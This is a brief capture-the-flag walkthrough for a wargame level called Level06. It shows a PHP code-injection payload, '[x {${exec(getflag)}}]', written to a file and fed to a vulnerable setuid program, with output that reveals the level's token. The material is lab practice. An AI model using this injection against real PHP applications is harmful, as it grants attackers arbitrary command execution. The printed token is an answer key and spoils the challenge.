# Level 06

# step 1 : analyze level06.php

# step 2 : php injection
```
$ echo '[x {${exec(getflag)}}]' > /tmp/injec.txt
$ ./level06 /tmp/injec.txt /tmp/injec.txt
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
